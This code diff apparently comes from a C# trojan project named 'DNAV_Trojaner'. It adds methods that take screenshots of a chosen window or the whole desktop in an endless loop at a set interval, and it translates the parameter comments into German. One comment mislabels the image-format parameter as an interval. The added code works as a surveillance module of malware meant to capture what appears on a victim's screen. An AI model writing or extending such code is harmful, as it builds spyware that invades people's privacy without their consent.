@@ -2,6 +2,7 @@
 using System.Runtime.InteropServices;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.Threading;
 
 namespace DNAV_Trojaner
 {
@@ -50,23 +51,57 @@ namespace DNAV_Trojaner
         /// <summary>
         /// Captures a screen shot of a specific window, and saves it to a file
         /// </summary>
-        /// <param name="handle"></param>
-        /// <param name="filename"></param>
-        /// <param name="format"></param>
+        /// <param name="handle">Handle des Zielfensters</param>
+        /// <param name="filename">Dateiname</param>
+        /// <param name="format">Dateiformat des Bildes</param>
         public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format)
         {
             Image img = CaptureWindow(handle);
             img.Save(filename, format);
         }
+
+        /// <summary>
+        /// Captures a screen shot of a specific window, and saves it to a file
+        /// </summary>
+        /// <param name="handle">Handle des Zielfensters</param>
+        /// <param name="filename">Dateiname</param>
+        /// <param name="format">Dateiformat des Bildes</param>
+        /// <param name="interval">Interval in Sekunden</param>
+        public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format, int interval)
+        {
+            while (true)
+            {
+                Image img = CaptureWindow(handle);
+                img.Save(filename, format);
+                Thread.Sleep(interval * 1000);
+            }
+        }
+
         /// <summary>
         /// Captures a screen shot of the entire desktop, and saves it to a file
         /// </summary>
-        /// <param name="filename"></param>
-        /// <param name="format"></param>
+        /// <param name="filename">Dateiname</param>
+        /// <param name="format">Interval in Sekunden</param>
         public void CaptureScreenToFile(string filename, ImageFormat format)
         {
             Image img = CaptureScreen();
             img.Save(filename, format);
+        }
+
+        /// <summary>
+        /// Captures a screen shot of the entire desktop, and saves it to a file
+        /// </summary>
+        /// <param name="filename">Dateiname</param>
+        /// <param name="format">Dateiformat des Bildes</param>
+        /// <param name="interval">Interval in Sekunden</param>
+        public void CaptureScreenToFile(string filename, ImageFormat format, int interval)
+        {
+            while (true)
+            {
+                Image img = CaptureScreen();
+                img.Save(filename, format);
+                Thread.Sleep(interval * 1000);
+            }
         }
 
         /// <summary>
